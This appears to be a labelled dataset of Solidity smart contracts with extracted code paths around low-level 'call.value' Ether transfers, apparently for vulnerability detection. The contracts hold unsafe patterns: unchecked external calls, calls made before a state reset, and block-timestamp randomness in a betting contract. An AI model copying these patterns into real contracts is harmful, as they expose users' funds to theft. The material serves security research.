{"sol name": "24007_1.sol", "label": 1, "first path": "function GetEther() public payable { if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) { msg.sender.call.value(0.3 ether); ExtractDepositTime[msg.sender] = 0; ", "second path": "function GetEther() public payable { if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) { msg.sender.call.value(0.3 ether); ExtractDepositTime[msg.sender] = 0; ", "third path": "function GetEther() public payable { if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) { msg.sender.call.value(0.3 ether); ExtractDepositTime[msg.sender] = 0; ", "long path": "pragma solidity ^0.4.19; contract GetSomeEther { address creator = msg.sender; uint256 public LastExtractTime; mapping (address=>uint256) public ExtractDepositTime; uint256 public freeEther; function Deposit() public payable { if(msg.value> 0.2 ether && freeEther >= 0.2 ether) { LastExtractTime = now + 2 days; ExtractDepositTime[msg.sender] = LastExtractTime; freeEther-=0.2 ether; } } function GetEther() public payable { if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) { msg.sender.call.value(0.3 ether); ExtractDepositTime[msg.sender] = 0; } } function PutEther() public payable { uint256 newVal = freeEther+msg.value; if(newVal>freeEther)freeEther=newVal; } function Kill() public payable  { if(msg.sender==creator && now>LastExtractTime + 2 days) { selfdestruct(creator); } else revert(); } function() public payable{} } "}
{"sol name": "23803_1.sol", "label": 0, "first path": "function () payable { if (!founder.call.value(msg.value)()) revert(); ", "second path": "function () payable { if (!founder.call.value(msg.value)()) revert(); ", "third path": "function () payable { if (!founder.call.value(msg.value)()) revert(); ", "long path": "pragma solidity ^0.4.11; contract TRUEToken  { string public constant name = \"TRUE Token\"; string public constant symbol = \"TRUE\"; uint public constant decimals = 18; uint256 _totalSupply    = 100000000 * 10**decimals; function totalSupply() constant returns (uint256 supply) { return _totalSupply; } function balanceOf(address _owner) constant returns (uint256 balance) { return balances[_owner]; } function approve(address _spender, uint256 _value) returns (bool success) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; } mapping(address => uint256) balances; mapping(address => mapping (address => uint256)) allowed; uint public baseStartTime; address public founder = 0x0; uint256 public distributed = 0; event AllocateFounderTokens(address indexed sender); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); function TRUEToken(address _founder) { founder = _founder; } function setStartTime(uint _startTime) { if (msg.sender!=founder) revert(); baseStartTime = _startTime; } function distribute(uint256 _amount, address _to) { if (msg.sender!=founder) revert(); if (distributed + _amount > _totalSupply) revert(); distributed += _amount; balances[_to] += _amount; Transfer(this, _to, _amount); } function transfer(address _to, uint256 _value) returns (bool success) { if (now < baseStartTime) revert(); if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) { balances[msg.sender] -= _value; balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; } else { return false; } } function changeFounder(address newFounder) { if (msg.sender!=founder) revert(); founder = newFounder; } function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { if (msg.sender != founder) revert(); if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) { balances[_to] += _value; balances[_from] -= _value; allowed[_from][msg.sender] -= _value; Transfer(_from, _to, _value); return true; } else { return false; } } function () payable { if (!founder.call.value(msg.value)()) revert(); } function kill() { if (msg.sender == founder) { suicide(founder); } } } "}
{"sol name": "39326_1.sol", "label": 0, "first path": "function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers { Proposal p = proposals[id]; if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw; if (p.currentResult > majorityMargin) { p.executed = true; if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw; p.proposalPassed = true; } else { p.proposalPassed = false; ProposalTallied(id, p.numberOfVotes, p.proposalPassed); library CreatorCongress { ", "second path": "function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers { Proposal p = proposals[id]; if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw; if (p.currentResult > majorityMargin) { p.executed = true; if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw; p.proposalPassed = true; } else { p.proposalPassed = false; ProposalTallied(id, p.numberOfVotes, p.proposalPassed); library CreatorCongress { ", "third path": "function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers { Proposal p = proposals[id]; if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw; if (p.currentResult > majorityMargin) { p.executed = true; if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw; p.proposalPassed = true; } else { p.proposalPassed = false; ProposalTallied(id, p.numberOfVotes, p.proposalPassed); library CreatorCongress { ", "long path": "pragma solidity ^0.4.4; contract Owned { address public owner; function setOwner(address _owner) onlyOwner { owner = _owner; } modifier onlyOwner { if (msg.sender != owner) throw; _; } } contract Destroyable { address public hammer; function setHammer(address _hammer) onlyHammer { hammer = _hammer; } function destroy() onlyHammer { suicide(msg.sender); } modifier onlyHammer { if (msg.sender != hammer) throw; _; } } contract Object is Owned, Destroyable { function Object() { owner  = msg.sender; hammer = msg.sender; } } contract ERC20 { uint256 public totalSupply; function balanceOf(address _owner) constant returns (uint256); function transfer(address _to, uint256 _value) returns (bool); function transferFrom(address _from, address _to, uint256 _value) returns (bool); function approve(address _spender, uint256 _value) returns (bool); function allowance(address _owner, address _spender) constant returns (uint256); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract Recipient { event ReceivedEther(address indexed sender, uint256 indexed amount); event ReceivedTokens(address indexed from, uint256 indexed value, address indexed token, bytes extraData); function receiveApproval(address _from, uint256 _value, ERC20 _token, bytes _extraData) { if (!_token.transferFrom(_from, this, _value)) throw; ReceivedTokens(_from, _value, _token, _extraData); } function () payable { ReceivedEther(msg.sender, msg.value); } } contract Congress is Object, Recipient { uint256 public minimumQuorum; uint256 public debatingPeriodInMinutes; int256 public majorityMargin; Proposal[] public proposals; function numProposals() constant returns (uint256) { return proposals.length; } Member[] public members; mapping(address => uint256) public memberId; event ProposalAdded(uint256 indexed proposal, address indexed recipient, uint256 indexed amount, string description); event Voted(uint256 indexed proposal, bool    indexed position, address indexed voter, string justification); event ProposalTallied(uint256 indexed proposal, uint256 indexed quorum, bool    indexed active); event MembershipChanged(address indexed member, bool    indexed isMember); event ChangeOfRules(uint256 indexed minimumQuorum, uint256 indexed debatingPeriodInMinutes, int256  indexed majorityMargin); struct Proposal { address recipient; uint256 amount; string  description; uint256 votingDeadline; bool    executed; bool    proposalPassed; uint256 numberOfVotes; int256  currentResult; bytes32 proposalHash; Vote[]  votes; mapping(address => bool) voted; } struct Member { address member; string  name; uint256 memberSince; } struct Vote { bool    inSupport; address voter; string  justification; } modifier onlyMembers { if (memberId[msg.sender] == 0) throw; _; } function Congress( uint256 minimumQuorumForProposals, uint256 minutesForDebate, int256  marginOfVotesForMajority, address congressLeader ) { changeVotingRules(minimumQuorumForProposals, minutesForDebate, marginOfVotesForMajority); addMember(0, ''); if (congressLeader != 0) addMember(congressLeader, 'The Founder'); } function addMember(address targetMember, string memberName) onlyOwner { if (memberId[targetMember] != 0) throw; memberId[targetMember] = members.length; members.push(Member({member:      targetMember, memberSince: now, name:        memberName})); MembershipChanged(targetMember, true); } function removeMember(address targetMember) onlyOwner { if (memberId[targetMember] == 0) throw; uint256 targetId = memberId[targetMember]; uint256 lastId   = members.length - 1; Member memory moved    = members[lastId]; members[targetId]      = moved; memberId[moved.member] = targetId; memberId[targetMember] = 0; delete members[lastId]; --members.length; MembershipChanged(targetMember, false); } function changeVotingRules( uint256 minimumQuorumForProposals, uint256 minutesForDebate, int256  marginOfVotesForMajority ) onlyOwner { minimumQuorum           = minimumQuorumForProposals; debatingPeriodInMinutes = minutesForDebate; majorityMargin          = marginOfVotesForMajority; ChangeOfRules(minimumQuorum, debatingPeriodInMinutes, majorityMargin); } function newProposal( address beneficiary, uint256 amount, string  jobDescription, bytes   transactionBytecode ) onlyMembers returns (uint256 id) { id               = proposals.length++; Proposal p       = proposals[id]; p.recipient      = beneficiary; p.amount         = amount; p.description    = jobDescription; p.proposalHash   = sha3(beneficiary, amount, transactionBytecode); p.votingDeadline = now + debatingPeriodInMinutes * 1 minutes; p.executed       = false; p.proposalPassed = false; p.numberOfVotes  = 0; ProposalAdded(id, beneficiary, amount, jobDescription); } function checkProposalCode( uint256 id, address beneficiary, uint256 amount, bytes   transactionBytecode ) constant returns (bool codeChecksOut) { return proposals[id].proposalHash == sha3(beneficiary, amount, transactionBytecode); } function vote( uint256 id, bool    supportsProposal, string  justificationText ) onlyMembers returns (uint256 vote) { Proposal p = proposals[id]; if (p.voted[msg.sender] == true) throw; p.voted[msg.sender] = true; p.numberOfVotes++; if (supportsProposal) { p.currentResult++; } else { p.currentResult--; } Voted(id,  supportsProposal, msg.sender, justificationText); } function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers { Proposal p = proposals[id]; if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw; if (p.currentResult > majorityMargin) { p.executed = true; if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw; p.proposalPassed = true; } else { p.proposalPassed = false; } ProposalTallied(id, p.numberOfVotes, p.proposalPassed); } } library CreatorCongress { function create(uint256 minimumQuorumForProposals, uint256 minutesForDebate, int256 marginOfVotesForMajority, address congressLeader) returns (Congress) { return new Congress(minimumQuorumForProposals, minutesForDebate, marginOfVotesForMajority, congressLeader); } function version() constant returns (string) { return \"v0.6.3\"; } function abi() constant returns (string) { return '[{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"proposals\",\"outputs\":[{\"name\":\"recipient\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"},{\"name\":\"description\",\"type\":\"string\"},{\"name\":\"votingDeadline\",\"type\":\"uint256\"},{\"name\":\"executed\",\"type\":\"bool\"},{\"name\":\"proposalPassed\",\"type\":\"bool\"},{\"name\":\"numberOfVotes\",\"type\":\"uint256\"},{\"name\":\"currentResult\",\"type\":\"int256\"},{\"name\":\"proposalHash\",\"type\":\"bytes32\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"targetMember\",\"type\":\"address\"}],\"name\":\"removeMember\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"setOwner\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"id\",\"type\":\"uint256\"},{\"name\":\"transactionBytecode\",\"type\":\"bytes\"}],\"name\":\"executeProposal\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"memberId\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"numProposals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"hammer\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"members\",\"outputs\":[{\"name\":\"member\",\"type\":\"address\"},{\"name\":\"name\",\"type\":\"string\"},{\"name\":\"memberSince\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"debatingPeriodInMinutes\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"minimumQuorum\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"destroy\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"},{\"name\":\"_token\",\"type\":\"address\"},{\"name\":\"_extraData\",\"type\":\"bytes\"}],\"name\":\"receiveApproval\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"majorityMargin\",\"outputs\":[{\"name\":\"\",\"type\":\"int256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"beneficiary\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"},{\"name\":\"jobDescription\",\"type\":\"string\"},{\"name\":\"transactionBytecode\",\"type\":\"bytes\"}],\"name\":\"newProposal\",\"outputs\":[{\"name\":\"id\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"minimumQuorumForProposals\",\"type\":\"uint256\"},{\"name\":\"minutesForDebate\",\"type\":\"uint256\"},{\"name\":\"marginOfVotesForMajority\",\"type\":\"int256\"}],\"name\":\"changeVotingRules\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"targetMember\",\"type\":\"address\"},{\"name\":\"memberName\",\"type\":\"string\"}],\"name\":\"addMember\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_hammer\",\"type\":\"address\"}],\"name\":\"setHammer\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"id\",\"type\":\"uint256\"},{\"name\":\"supportsProposal\",\"type\":\"bool\"},{\"name\":\"justificationText\",\"type\":\"string\"}],\"name\":\"vote\",\"outputs\":[{\"name\":\"vote\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"id\",\"type\":\"uint256\"},{\"name\":\"beneficiary\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"},{\"name\":\"transactionBytecode\",\"type\":\"bytes\"}],\"name\":\"checkProposalCode\",\"outputs\":[{\"name\":\"codeChecksOut\",\"type\":\"bool\"}],\"payable\":false,\"type\":\"function\"},{\"inputs\":[{\"name\":\"minimumQuorumForProposals\",\"type\":\"uint256\"},{\"name\":\"minutesForDebate\",\"type\":\"uint256\"},{\"name\":\"marginOfVotesForMajority\",\"type\":\"int256\"},{\"name\":\"congressLeader\",\"type\":\"address\"}],\"payable\":false,\"type\":\"constructor\"},{\"payable\":true,\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"proposal\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"description\",\"type\":\"string\"}],\"name\":\"ProposalAdded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"proposal\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"position\",\"type\":\"bool\"},{\"indexed\":true,\"name\":\"voter\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"justification\",\"type\":\"string\"}],\"name\":\"Voted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"proposal\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"quorum\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"active\",\"type\":\"bool\"}],\"name\":\"ProposalTallied\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"member\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"isMember\",\"type\":\"bool\"}],\"name\":\"MembershipChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"minimumQuorum\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"debatingPeriodInMinutes\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"majorityMargin\",\"type\":\"int256\"}],\"name\":\"ChangeOfRules\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"ReceivedEther\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"token\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"extraData\",\"type\":\"bytes\"}],\"name\":\"ReceivedTokens\",\"type\":\"event\"}]'; } } contract Builder is Object { event Builded(address indexed client, address indexed instance); mapping(address => address[]) public getContractsOf; function getLastContract() constant returns (address) { var sender_contracts = getContractsOf[msg.sender]; return sender_contracts[sender_contracts.length - 1]; } address public beneficiary; function setBeneficiary(address _beneficiary) onlyOwner { beneficiary = _beneficiary; } uint public buildingCostWei; function setCost(uint _buildingCostWei) onlyOwner { buildingCostWei = _buildingCostWei; } string public securityCheckURI; function setSecurityCheck(string _uri) onlyOwner { securityCheckURI = _uri; } } contract BuilderCongress is Builder { function create(uint256 minimumQuorumForProposals, uint256 minutesForDebate, int256 marginOfVotesForMajority, address congressLeader, address _client) payable returns (address) { if (buildingCostWei > 0 && beneficiary != 0) { if (msg.value < buildingCostWei) throw; if (!beneficiary.send(buildingCostWei)) throw; if (msg.value > buildingCostWei) { if (!msg.sender.send(msg.value - buildingCostWei)) throw; } } else { if (msg.value > 0) { if (!msg.sender.send(msg.value)) throw; } } if (_client == 0) _client = msg.sender; if (congressLeader == 0) congressLeader = _client; var inst = CreatorCongress.create(minimumQuorumForProposals, minutesForDebate, marginOfVotesForMajority, congressLeader); inst.setOwner(_client); inst.setHammer(_client); getContractsOf[_client].push(inst); Builded(_client, inst); return inst; } } "}
{"sol name": "30101_1.sol", "label": 0, "first path": "function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); ", "second path": "function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); ", "third path": "function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); ", "long path": "pragma solidity ^0.4.18; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a * b; assert(a == 0 || c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract TelcoinSaleCapEscrow { using SafeMath for uint256; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); event WalletChanged(address indexed previousWallet, address indexed newWallet); event ValuePlaced(address indexed purchaser, address indexed beneficiary, uint256 amount); event Approved(address indexed participant, uint256 amount); event Rejected(address indexed participant); event Closed(); address public owner; address public wallet; bool public closed = false; mapping(address => uint256) public deposited; modifier onlyOwner() { require(msg.sender == owner); _; } modifier escrowOpen() { require(!closed); _; } function TelcoinSaleCapEscrow(address _wallet) public payable { require(msg.value > 0); require(_wallet != address(0)); owner = msg.sender; wallet = _wallet; wallet.transfer(msg.value); } function () public payable { placeValue(msg.sender); } function approve(address _participant, uint256 _weiAmount) onlyOwner public { uint256 depositedAmount = deposited[_participant]; require(depositedAmount > 0); require(_weiAmount <= depositedAmount); deposited[_participant] = depositedAmount.sub(_weiAmount); Approved(_participant, _weiAmount); wallet.transfer(_weiAmount); } function approveMany(address[] _participants, uint256[] _weiAmounts) onlyOwner public { require(_participants.length == _weiAmounts.length); for (uint256 i = 0; i < _participants.length; i++) { approve(_participants[i], _weiAmounts[i]); } } function changeWallet(address _wallet) onlyOwner public payable { require(_wallet != 0x0); require(msg.value > 0); WalletChanged(wallet, _wallet); wallet = _wallet; wallet.transfer(msg.value); } function close() onlyOwner public { require(!closed); closed = true; Closed(); } function placeValue(address _beneficiary) escrowOpen public payable { require(_beneficiary != address(0)); uint256 weiAmount = msg.value; require(weiAmount > 0); uint256 newDeposited = deposited[_beneficiary].add(weiAmount); deposited[_beneficiary] = newDeposited; ValuePlaced( msg.sender, _beneficiary, weiAmount ); } function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); } function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); } } function transferOwnership(address _to) onlyOwner public { require(_to != address(0)); OwnershipTransferred(owner, _to); owner = _to; } } "}
{"sol name": "9221_1.sol", "label": 0, "first path": "function bet() payable { if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  { if (!msg.sender.call.value(2 ether)()) throw; function releaseFunds(uint amount) { if (gameOwner==msg.sender)  { if (!msg.sender.call.value( amount * (1 ether))()) throw; ", "second path": "function bet() payable { if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  { if (!msg.sender.call.value(2 ether)()) throw; function releaseFunds(uint amount) { if (gameOwner==msg.sender)  { if (!msg.sender.call.value( amount * (1 ether))()) throw; ", "third path": "function bet() payable { if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  { if (!msg.sender.call.value(2 ether)()) throw; function releaseFunds(uint amount) { if (gameOwner==msg.sender)  { if (!msg.sender.call.value( amount * (1 ether))()) throw; ", "long path": "pragma solidity ^0.4.24; contract EtherBet{ address gameOwner = address(0); bool locked = false; function bet() payable { if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  { if (!msg.sender.call.value(2 ether)()) throw; } } function lock() { if (gameOwner==msg.sender) { locked = true; } } function unlock()  { if (gameOwner==msg.sender) { locked = false; } } function own(address owner) { if ((gameOwner == address(0)) || (gameOwner == msg.sender)) { gameOwner = owner; } } function releaseFunds(uint amount) { if (gameOwner==msg.sender)  { if (!msg.sender.call.value( amount * (1 ether))()) throw; } } function random() view returns (uint8) { return uint8(uint256(keccak256(block.timestamp, block.difficulty))%256); } function () public  payable { bet(); } } "}
{"sol name": "39705_1.sol", "label": 0, "first path": "function empty() returns (bool) { return foundationWallet.call.value(this.balance)(); function donateAs(address addr) private returns (bool) { state st = getState(); if (st != state.round0 && st != state.round1) { throw; } if (msg.value < minDonation) { throw; } if (weiPerCHF == 0) { throw; } totalWeiDonated += msg.value; weiDonated[addr] += msg.value; uint chfCents = (msg.value * 100) / weiPerCHF; bookDonation(addr, now, chfCents, \"ETH\", \"\"); return foundationWallet.call.value(this.balance)(); ", "second path": "function empty() returns (bool) { return foundationWallet.call.value(this.balance)(); function donateAs(address addr) private returns (bool) { state st = getState(); if (st != state.round0 && st != state.round1) { throw; } if (msg.value < minDonation) { throw; } if (weiPerCHF == 0) { throw; } totalWeiDonated += msg.value; weiDonated[addr] += msg.value; uint chfCents = (msg.value * 100) / weiPerCHF; bookDonation(addr, now, chfCents, \"ETH\", \"\"); return foundationWallet.call.value(this.balance)(); ", "third path": "function empty() returns (bool) { return foundationWallet.call.value(this.balance)(); function donateAs(address addr) private returns (bool) { state st = getState(); if (st != state.round0 && st != state.round1) { throw; } if (msg.value < minDonation) { throw; } if (weiPerCHF == 0) { throw; } totalWeiDonated += msg.value; weiDonated[addr] += msg.value; uint chfCents = (msg.value * 100) / weiPerCHF; bookDonation(addr, now, chfCents, \"ETH\", \"\"); return foundationWallet.call.value(this.balance)(); ", "long path": "pragma solidity ^0.4.6; contract TokenTracker { uint public restrictedShare; mapping(address => uint) public tokens; mapping(address => uint) public restrictions; uint public totalRestrictedTokens; uint public totalUnrestrictedTokens; uint public totalRestrictedAssignments; uint public totalUnrestrictedAssignments; bool public assignmentsClosed = false; uint public burnMultDen; uint public burnMultNom; function TokenTracker(uint _restrictedShare) { if (_restrictedShare >= 100) { throw; } restrictedShare = _restrictedShare; } function isUnrestricted() constant returns (bool) { return (assignmentsClosed && totalRestrictedTokens == 0); } function multFracCeiling(uint x, uint a, uint b) returns (uint) { if (a == 0) { return 0; } return (x * a + (b - 1)) / b; } function isRegistered(address addr, bool restricted) constant returns (bool) { if (restricted) { return (restrictions[addr] > 0); } else { return (tokens[addr] > 0); } } function assign(address addr, uint tokenAmount, bool restricted) internal { if (assignmentsClosed) { throw; } tokens[addr] += tokenAmount; if (restricted) { totalRestrictedTokens += tokenAmount; totalRestrictedAssignments += 1; restrictions[addr] += tokenAmount; } else { totalUnrestrictedTokens += tokenAmount; totalUnrestrictedAssignments += 1; } } function closeAssignmentsIfOpen() internal { if (assignmentsClosed) { return; } assignmentsClosed = true; uint totalTokensTarget = (totalUnrestrictedTokens * 100) / (100 - restrictedShare); uint totalTokensExisting = totalRestrictedTokens + totalUnrestrictedTokens; uint totalBurn = 0; if (totalTokensExisting > totalTokensTarget) { totalBurn = totalTokensExisting - totalTokensTarget; } burnMultNom = totalBurn; burnMultDen = totalRestrictedTokens; } function unrestrict(address addr) internal returns (uint) { if (!assignmentsClosed) { throw; } uint restrictionsForAddr = restrictions[addr]; if (restrictionsForAddr == 0) { throw; } uint burn = multFracCeiling(restrictionsForAddr, burnMultNom, burnMultDen); tokens[addr] -= burn; delete restrictions[addr]; totalRestrictedTokens   -= restrictionsForAddr; totalUnrestrictedTokens += restrictionsForAddr - burn; return burn; } } contract Phased { uint[] public phaseEndTime; uint public N; mapping(uint => uint) public maxDelay; function getPhaseAtTime(uint time) constant returns (uint n) { if (time > now) { throw; } while (n < N && phaseEndTime[n] <= time) { n++; } } function isPhase(uint time, uint n) constant returns (bool) { if (time > now) { throw; } if (n >= N) { throw; } if (n > 0 && phaseEndTime[n-1] > time) { return false; } if (n < N && time >= phaseEndTime[n]) { return false; } return true; } function getPhaseStartTime(uint n) constant returns (uint) { if (n == 0) { throw; } return phaseEndTime[n-1]; } function addPhase(uint time) internal { if (N > 0 && time <= phaseEndTime[N-1]) { throw; } if (time <= now) { throw; } phaseEndTime.push(time); N++; } function setMaxDelay(uint i, uint timeDelta) internal { if (i >= N) { throw; } maxDelay[i] = timeDelta; } function delayPhaseEndBy(uint n, uint timeDelta) internal { if (n >= N) { throw; } if (now >= phaseEndTime[n]) { throw; } if (timeDelta > maxDelay[n]) { throw; } maxDelay[n] -= timeDelta; for (uint i = n; i < N; i++) { phaseEndTime[i] += timeDelta; } } function endCurrentPhaseIn(uint timeDelta) internal { uint n = getPhaseAtTime(now); if (n >= N) { throw; } if (timeDelta == 0) { timeDelta = 1; } if (now + timeDelta < phaseEndTime[n]) { phaseEndTime[n] = now + timeDelta; } } } contract StepFunction { uint public phaseLength; uint public nSteps; uint public step; function StepFunction(uint _phaseLength, uint _initialValue, uint _nSteps) { if (_nSteps > _phaseLength) { throw; } step = _initialValue / _nSteps; if ( step * _nSteps != _initialValue) { throw; } phaseLength = _phaseLength; nSteps = _nSteps; } function getStepFunction(uint elapsedTime) constant returns (uint) { if (elapsedTime >= phaseLength) { throw; } uint timeLeft  = phaseLength - elapsedTime - 1; uint stepsLeft = ((nSteps + 1) * timeLeft) / phaseLength; return stepsLeft * step; } } contract Targets { mapping(uint => uint) public counter; mapping(uint => uint) public target; function targetReached(uint id) constant returns (bool) { return (counter[id] >= target[id]); } function setTarget(uint id, uint _target) internal { target[id] = _target; } function addTowardsTarget(uint id, uint amount) internal returns (bool firstReached) { firstReached = (counter[id] < target[id]) && (counter[id] + amount >= target[id]); counter[id] += amount; } } contract Parameters { uint public constant round0StartTime      = 1484676000; uint public constant round1StartTime      = 1495040400; uint public constant round0EndTime        = round0StartTime + 6 weeks; uint public constant round1EndTime        = round1StartTime + 6 weeks; uint public constant finalizeStartTime    = round1EndTime   + 1 weeks; uint public constant finalizeEndTime      = finalizeStartTime + 1000 years; uint public constant maxRoundDelay     = 270 days; uint public constant gracePeriodAfterRound0Target  = 1 days; uint public constant gracePeriodAfterRound1Target  = 0 days; uint public constant tokensPerCHF = 10; uint public constant minDonation = 1 ether; uint public constant round0Bonus = 200; uint public constant round1InitialBonus = 25; uint public constant round1BonusSteps = 5; uint public constant millionInCents = 10**6 * 100; uint public constant round0Target = 1 * millionInCents; uint public constant round1Target = 20 * millionInCents; uint public constant earlyContribShare = 22; } contract FDC is TokenTracker, Phased, StepFunction, Targets, Parameters { string public name; enum state { pause, earlyContrib, round0, round1, offChainReg, finalization, done } mapping(uint => state) stateOfPhase; mapping(bytes32 => bool) memoUsed; address[] public donorList; address[] public earlyContribList; uint public weiPerCHF; uint public totalWeiDonated; 